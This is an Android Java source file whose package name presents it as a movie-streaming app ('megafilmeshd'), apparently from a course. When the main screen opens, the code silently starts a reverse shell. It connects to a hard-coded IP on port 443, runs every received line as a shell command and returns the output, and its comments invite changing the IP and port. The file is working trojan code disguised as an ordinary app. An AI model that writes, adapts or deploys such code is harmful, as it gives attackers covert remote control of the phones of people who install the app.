package com.curso.megafilmeshd;

import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    PrintWriter out;
    BufferedReader in;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getShell();

    }

    private void getShell() {


        Thread thread = new Thread() {

            @Override
            public void run() {

                final String IP = "10.0.1.4"; //alterar IP
                final int PORT = 443; //alterar porta

                try {

                    InetAddress HOST = InetAddress.getByName(IP);

                    Socket socket = new Socket(HOST, PORT);

                    Log.d("Mastermind-TCP", String.format("Conectado %s:%d (TCP)", HOST, PORT));

                    while (true) {

                        out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);

                        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                        String command = in.readLine();

                        Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", command});

                        BufferedReader reader = new BufferedReader(
                                new InputStreamReader(process.getInputStream()));
                        int read;
                        char[] buffer = new char[4096];
                        StringBuffer output = new StringBuffer();
                        while ((read = reader.read(buffer)) > 0) {
                            output.append(buffer, 0, read);
                        }
                        reader.close();

                        String commandoutput = output.toString();

                        process.waitFor();

                        if (commandoutput != null) {

                            sendOutput(commandoutput);

                        }
                        out = null;

                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        };
        thread.start();

    }
    private void sendOutput(String commandoutput) {

        if (out != null && !out.checkError()) {
            out.println(commandoutput);
            out.flush();
        }

    }
}
